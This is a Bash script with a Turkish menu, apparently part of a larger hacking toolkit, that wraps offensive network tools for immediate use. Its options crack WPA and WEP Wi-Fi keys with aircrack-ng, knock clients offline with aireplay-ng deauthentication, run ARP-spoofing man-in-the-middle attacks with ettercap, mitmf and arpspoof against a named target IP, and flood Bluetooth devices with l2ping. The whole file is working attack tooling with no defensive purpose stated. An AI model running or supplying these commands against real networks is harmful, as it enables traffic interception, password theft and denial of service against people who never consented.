#! /bin/bash 
clear
red="\033[1;31m"
echo "---------------Network-------------"
echo -e $red"1)Mac Değiştir 
2)Ağdaki cihazları tara
3)Genel Ağ IP'ni sorgula
4)Wpa/Wpa2 Kır
5)WEP Kır
6)Ağ kartını Managed moda al
7)Ağ kartını Monitor moda al
8)Ağ kartını yeniden başlat
9)MitM
10)Ağ Bağlantısı kes
11)Mitmf
12)Bluetooth killer
13)Ağ içi bağlantı kes
14)geri
"
echo -n "
Bir İşlem seçiniz: "
read islem2
case $islem2 in
	1)ifconfig wlan0 down
	  macchanger -r wlan0
          ifconfig wlan0 up
		sleep 5 
	       	 cd -
		 ./Çalıştır.sh;;
	2)netdiscover -i wlan0;;
	3)curl icanhazip.com
		sleep 5
	    cd -
		./Çalıştır.sh;;	
	4)airmon-ng start wlan0
	   airodump-ng wlan0mon
	   echo -n "Kanal: "
		read kanal23
	   echo -n "MAc adres: "
		read mac23
	   echo -n "Wordlist: "
		read wordlist23
	   airodump-ng -c $kanal23 -w deneme --bssid $mac23 wlan0mon
	   aircrack-ng -w $wordlist23 deneme-01.cap;;
	5)airmon-ng start wlan0
	   airodump-ng wlan0mon
	   echo -n "Kanal: "
		read kanal25
	   echo -n "MAc adres: "
		read mac25
	   echo -n "Wordlist: "
		read wordlist25
	   airodump-ng -c $kanal25 -w deneme --bssid $mac25 wlan0mon
	   aircrack-ng deneme-01.cap;;
	6)service network-manager start
		 echo "Tamamlandı"
		  sleep 1 
	    	   cd -
		./Çalıştır.sh;;
	7)service network-manager stop
		echo "Tamamlandı"
		sleep 1 
	   cd -
		./Çalıştır.sh;;
	8)service network-manager restart
		echo "Tamamlandı"
		sleep 1 
	   cd - 
		./Çalıştır.sh;;
	9)echo 1 > /proc/sys/net/ipv4/ip_forward
	   echo -n "Hedef IP adresi nedir: "
		read hedef234
	   echo -n "Sizin ag ici IP adresiniz nedir: "
		read localip12
	   ettercap -Tq -M arp:remote -S -i wlan0 /$localip12// /$hedef234//;;
	10)airmon-ng start wlan0
	  airodump-ng wlan0mon
	  echo -n "mac adresini giriniz: "
		read mac
	  echo -n "kaydedilecek dosya adini giriniz: "
	  	read dosya2
	  echo -n "kanal i giriniz: "
		read kanal
	  airodump-ng -c $kanal -w $dosya2 --bssid $mac wlan0mon
	  aireplay-ng -0 0 -a $mac wlan0mon;;
	11)apt-get install mitmf 
	   echo -n "Hedef IP Adresi: "
	   read hedef1234
	   echo -n "Modem IP Adresi: "
	   read modem123
	   echo "İnterface: "
	   read interface 
	   mitmf --arp --spoof --gateway $modem123 --target $hedef1234 -i $interface;;
	12)hciconfig
	   hciconfig hci0 up
	   hcitool scan
	   echo -n "Mac adres: "
	   	read macadres189
	   xterm -e "l2ping $macadres189;$SHELL"
	   xterm -e "l2ping $macadres189;$SHELL"
	   xterm -e "l2ping $macadres189;$SHELL"
	   xterm -e "l2ping $macadres189;$SHELL";;
	   
	 13)echo -n "Modem ıp'si:"
		read modem3435
	   echo -n "İnterface:"
		read interface125
	   xterm -e "netdiscover -i $interface125;$SHELL"
	   echo -n "Hedef ıp'si:" 
		read hedef5657
	   arpspoof -i $interface125 -t $hedef5657  $modem3435 | xterm -e arpspoof -i $interface125 -t $hedef5657  $modem3435;;
	
	14)cd -
		./Çalıştır.sh;;
	*)echo "Yanlış Bir değer girdiniz..." 
		exit;;

esac 
